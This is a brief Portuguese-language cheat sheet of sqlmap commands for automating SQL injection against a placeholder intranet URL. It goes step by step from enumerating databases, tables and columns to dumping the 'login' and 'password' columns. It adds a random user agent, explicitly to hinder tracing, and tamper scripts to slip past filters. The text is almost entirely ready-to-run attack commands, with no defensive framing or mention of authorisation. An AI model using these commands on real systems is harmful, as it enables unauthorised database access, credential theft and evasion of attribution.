# SQLMAP

Ferramente para automatização de SQL Injection.
http://sqlmap.org

Testar todos os bancos de dados de um URL:
sqlmap -u "http://intranet.alvo.com.br:8080/cat.php?id=3" --dbs

Especificar um determinado banco de dados:
sqlmap -u "http://intranet.alvo.com.br:8080/cat.php?id=3" --current-db --dbms=mysql
*O **current-db** pega o banco de dados em execução no momento.*

Utilizar um agente randômico para dificultar a rastreabilidade:
sqlmap -u "http://intranet.alvo.com.br:8080/cat.php?id=3" --current-db --dbms=mysql --random-agent

Acessando o banco de dados e listando as tabelas:
sqlmap -u "http://intranet.alvo.com.br:8080/cat.php?id=3" --dbms=mysql --random-agent -D nomedobanco --tables

Listando as colunas da tabela:
sqlmap -u "http://intranet.alvo.com.br:8080/cat.php?id=3" --current-db --dbms=mysql --random-agent -D nomedobanco -T nomedatabela --columns

Efetuando o dump das informações:
sqlmap -u "http://intranet.alvo.com.br:8080/cat.php?id=3" --current-db --dbms=mysql --random-agent -D nomedobanco -T nomedatabela -C 'login,password' --dump
*Acima foi efetuado o dump na coluna **login** e **password**.*

Há alguns scripts de tamper no sequinte diretório:
/usr/share/sqlmap/tamper/

Utilizando o tamper:
sqlmap -u "http://intranet.alvo.com.br:8080/cat.php?id=3" --current-db --dbms=mysql --random-agent --tamper="namescript.py"

Tentando formulário:
sqlmap -u "http://intranet.alvo.com.br:8080/cat.php?id=3" --current-db --dbms=mysql --random-agent --forms

Especificando formulário para testar:
sqlmap -u "http://intranet.alvo.com.br:8080/cat.php?id=3" --current-db --dbms=mysql --random-agent --data="campo3="
